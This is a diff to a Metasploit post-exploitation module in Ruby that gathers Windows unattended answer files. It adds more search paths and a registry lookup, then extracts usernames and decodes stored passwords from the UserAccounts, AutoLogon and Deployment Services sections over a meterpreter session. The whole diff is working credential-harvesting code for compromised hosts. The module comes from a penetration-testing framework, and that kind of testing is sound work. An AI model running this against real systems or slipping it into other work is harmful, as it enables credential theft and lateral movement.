@@ -15,25 +15,32 @@ class Metasploit3 < Msf::Post
 
 	def initialize(info={})
 		super( update_info( info,
-			'Name'          => 'Windows Gather Unattended Answer File (unattend.xml) Enumeration',
+			'Name'          => 'Windows Gather Unattended Answer File Enumeration',
 			'Description'   => %q{
-					This module will check the file system for a copy of unattend.xml found in
-				Windows Vista, or newer Windows systems.  And then extract sensitive information
-				such as usernames and decoded passwords.
+					This module will check the file system for a copy of unattend.xml and/or
+				autounattend.xml found in Windows Vista, or newer Windows systems.  And then
+				extract sensitive information such as usernames and decoded passwords.
 			},
 			'License'       => MSF_LICENSE,
 			'Author'        =>
 				[
 					'Sean Verity <veritysr1980[at]gmail.com>',
-					'sinn3r'
+					'sinn3r',
+					'Ben Campbell <eat_meatballs[at]hotmail.co.uk>'
 				],
 			'References'    =>
 				[
-					['URL', 'http://technet.microsoft.com/en-us/library/ff715801']
+					['URL', 'http://technet.microsoft.com/en-us/library/ff715801'],
+					['URL', 'http://technet.microsoft.com/en-us/library/cc749415(v=ws.10).aspx']
 				],
 			'Platform'      => [ 'windows' ],
 			'SessionTypes'  => [ 'meterpreter' ]
 		))
+
+		register_options(
+			[
+				OptBool.new('GETALL', [true, 'Collect all unattend.xml that are found', true])
+			], self.class)
 	end
 
 
@@ -47,46 +54,39 @@ class Metasploit3 < Msf::Post
 
 
 	#
-	# Read the raw content of unattend.xml
+	# Read and parse the XML file
 	#
 	def load_unattend(xml_path)
 		print_status("Reading #{xml_path}")
 		f = session.fs.file.new(xml_path)
-		buf = ""
+		raw = ""
 		until f.eof?
-			buf << f.read
+			raw << f.read
 		end
 
-		return buf
+		begin
+			xml = REXML::Document.new(raw)
+		rescue REXML::ParseException => e
+			print_error("Invalid XML format")
+			vprint_line(e.message)
+			return nil, raw
+		end
+
+		return xml, raw
 	end
 
 
 	#
-	# Extract all the interesting information from unattend.xml,
-	# and return an array or tables
+	# Extract sensitive data from UserAccounts
 	#
-	def extract_creds(f)
-		begin
-			xml = REXML::Document.new(f)
-		rescue REXML::ParseException => e
-			print_error("Invalid XML format")
-			vprint_line(e.message)
-			return []
-		end
-		base_node = 'unattend/settings/component/UserAccounts'
-		user_accounts = xml.elements[base_node]
-
-		# If there's no UsersAccounts, then there's no point to continue
-		if user_accounts.nil?
-			print_error("No UserAccounts node found")
-			return []
-		end
+	def extract_useraccounts(user_accounts)
+		return[] if user_accounts.nil?
 
 		cred_tables = []
 		account_types = ['AdministratorPassword', 'DomainAccounts', 'LocalAccounts']
 		account_types.each do |t|
-			node = user_accounts.elements[t]
-			next if node.nil?
+			element = user_accounts.elements[t]
+			next if element.nil?
 
 			case t
 			#
@@ -99,8 +99,8 @@ class Metasploit3 < Msf::Post
 					'Columns' => ['Username', 'Password']
 				})
 
-				password = node.elements['Value'].get_text rescue ''
-				plaintext = node.elements['PlainText'].get_text rescue 'false'
+				password = element.elements['Value'].get_text.value rescue ''
+				plaintext = element.elements['PlainText'].get_text.value rescue 'true'
 
 				if plaintext == 'false'
 					password = Rex::Text.decode_base64(password)
@@ -123,9 +123,9 @@ class Metasploit3 < Msf::Post
 					'Columns' => ['Username', 'Group']
 				})
 
-				node.elements.each do |account_list|
-					name = account_list.elements['DomainAccount/Name'].get_text rescue ''
-					group = account_list.elements['DomainAccount/Group'].get_text rescue ''
+				element.elements.each do |account_list|
+					name = account_list.elements['DomainAccount/Name'].get_text.value rescue ''
+					group = account_list.elements['DomainAccount/Group'].get_text.value rescue 'true'
 
 					table << [name, group]
 				end
@@ -142,16 +142,16 @@ class Metasploit3 < Msf::Post
 					'Columns' => ['Username', 'Password']
 				})
 
-				node.elements.each do |local|
-					password = local.elements['Password/Value'].get_text rescue ''
-					plaintext = local.elements['Password/Plaintext'].get_text rescue 'false'
+				element.elements.each do |local|
+					password = local.elements['Password/Value'].get_text.value rescue ''
+					plaintext = local.elements['Password/PlainText'].get_text.value rescue 'true'
 
 					if plaintext == 'false'
 						password = Rex::Text.decode_base64(password)
 						password = password.gsub(/#{Rex::Text.to_unicode('Password')}$/, '')
 					end
 
-					username = local.elements['Name'].get_text rescue ''
+					username = local.elements['Name'].get_text.value rescue ''
 					table << [username, password]
 				end
 
@@ -160,6 +160,64 @@ class Metasploit3 < Msf::Post
 		end
 
 		return cred_tables
+	end
+
+
+	#
+	# Extract sensitive data from AutoLogon
+	#
+	def extract_autologon(auto_logon)
+		return [] if auto_logon.nil?
+
+		domain    = auto_logon.elements['Domain'].get_text.value rescue ''
+		username  = auto_logon.elements['Username'].get_text.value rescue ''
+		password  = auto_logon.elements['Password/Value'].get_text.value rescue ''
+		plaintext = auto_logon.elements['Password/PlainText'].get_text.value rescue 'true'
+
+		if plaintext == 'false'
+			password = Rex::Text.decode_base64(password)
+			password = password.gsub(/#{Rex::Text.to_unicode('Password')}$/, '')
+		end
+
+		table = Rex::Ui::Text::Table.new({
+			'Header' => 'AutoLogon',
+			'Indent' => 1,
+			'Columns' => ['Domain', 'Username', 'Password']
+		})
+
+		table << [domain, username, password]
+
+		return [table]
+	end
+
+
+	#
+	# Extract sensitive data from Deployment Services.
+	# We can only seem to add one <Login> with Windows System Image Manager, so
+	# we'll only enum one.
+	#
+	def extract_deployment(deployment)
+		return [] if deployment.nil?
+
+		domain    = deployment.elements['Login/Credentials/Domain'].get_text.value rescue ''
+		username  = deployment.elements['Login/Credentials/Username'].get_text.value rescue ''
+		password  = deployment.elements['Login/Credentials/Password'].get_text.value rescue ''
+		plaintext = deployment.elements['Login/Credentials/Password/PlainText'].get_text.value rescue 'true'
+
+		if plaintext == 'false'
+			password = Rex::Text.decode_base64(password)
+			password = password.gsub(/#{Rex::Text.to_unicode('Password')}$/, '')
+		end
+
+		table = Rex::Ui::Text::Table.new({
+			'Header' => 'WindowsDeploymentServices',
+			'Indent' => 1,
+			'Columns' => ['Domain', 'Username', 'Password']
+		})
+
+		table << [domain, username, password]
+
+		return [table]
 	end
 
 
@@ -183,31 +241,101 @@ class Metasploit3 < Msf::Post
 	end
 
 
-	def run
+	#
+	# If we spot a path for the answer file, we should check it out too
+	#
+	def get_registry_unattend_path
+		# HKLM\System\Setup!UnattendFile
+		begin
+			key = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'SYSTEM')
+			fname = key.query_value('Setup!UnattendFile').data
+			return fname
+		rescue Rex::Post::Meterpreter::RequestError
+			return ''
+		end
+	end
+
+
+	#
+	# Initialize all 7 possible paths for the answer file
+	#
+	def init_paths
 		drive = session.fs.file.expand_path("%SystemDrive%")
-		xml_path = "#{drive}\\Windows\\System32\\sysprep\\unattend.xml"
+		
+		files =
+			[
+				'unattend.xml',
+				'autounattend.xml'
+			]
 
-		# If unattend.xml doesn't exist, no point to continue
-		if not unattend_exists?(xml_path)
-			print_error("#{xml_path} not found")
-			return
+		target_paths =
+			[
+				"#{drive}\\",
+				"#{drive}\\Windows\\System32\\sysprep\\",
+				"#{drive}\\Windows\\panther\\",
+				"#{drive}\\Windows\\Panther\Unattend\\",
+				"#{drive}\\Windows\\System32\\"
+			]
+
+		# Don't really want to create another indent level, so we do it this way
+		paths = []
+		target_paths.each do |p|
+			files.each do |f|
+				paths << "#{p}#{f}"
+			end
 		end
 
-		# If unattend.xml is actually empty, no point to continue, either.
-		f = load_unattend(xml_path)
-		if f.empty?
-			print_error("#{xml_path} is empty")
-			return
+		# If there is one for registry, we add it to the list too
+		reg_path = get_registry_unattend_path
+		paths << reg_path if not reg_path.empty?
+
+		return paths
+	end
+
+
+	def run
+		paths = init_paths
+
+		paths.each do |xml_path|
+			# If unattend.xml doesn't exist, move on to the next one
+			if not unattend_exists?(xml_path)
+				vprint_error("#{xml_path} not found")
+				next
+			end
+
+			xml, raw = load_unattend(xml_path)
+
+			# Save the raw version in case the user wants more information
+			if not raw.empty?
+				fname = ::File.basename(xml_path)
+				p = save_raw(raw)
+				print_status("Raw version of #{fname} saved as: #{p}")
+			end
+
+			# XML failed to parse, will not go on from here
+			return if not xml
+
+			# Extract the credentials
+			tables = []
+			unattend = xml.elements['unattend']
+			return if unattend.nil?
+
+			unattend.each_element do |settings|
+				next if settings.class != REXML::Element
+				settings.get_elements('component').each do |c|
+					next if c.class != REXML::Element
+					tables << extract_useraccounts(c.elements['UserAccounts'])
+					tables << extract_autologon(c.elements['AutoLogon'])
+					tables << extract_deployment(c.elements['WindowsDeploymentServices'])
+				end
+			end
+
+			tables = tables.flatten
+
+			# Save the data
+			save_cred_tables(tables) if not tables.empty?
+
+			return if not datastore['GETALL']
 		end
-
-		# Save the raw version in case the user wants more information
-		p = save_raw(f)
-		print_status("Raw version of unattend.xml saved as: #{p}")
-
-		# Extract the credentials
-		cred_tables = extract_creds(f)
-
-		# Save the data
-		save_cred_tables(cred_tables)
 	end
 end
